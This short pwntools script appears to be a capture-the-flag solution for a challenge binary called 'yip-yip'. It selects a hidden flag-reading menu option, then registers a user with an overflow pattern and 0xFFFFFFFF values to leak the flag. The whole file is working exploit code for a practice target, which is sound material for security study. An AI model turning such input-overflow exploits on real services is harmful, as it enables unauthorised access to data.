#!/usr/bin/env python3

from pwn import *

encode = lambda e: e if type(e) == bytes else str(e).encode()

exe = "./yip-yip"
elf = context.binary = ELF(exe)
io = remote(sys.argv[1], int(sys.argv[2])) \
	if args.REMOTE else process()

# Read the flag
io.sendlineafter(b">> ", b"69")

# Register the user:
io.sendlineafter(b">> ", b"01")
io.sendlineafter(b": ", cyclic(0x18))
io.sendlineafter(b"? ", encode(0xFFFFFFFF))
io.sendlineafter(b"? ", encode(0xFFFFFFFF))

# Print:
io.sendlineafter(b">> ", b"02")

io.interactive()
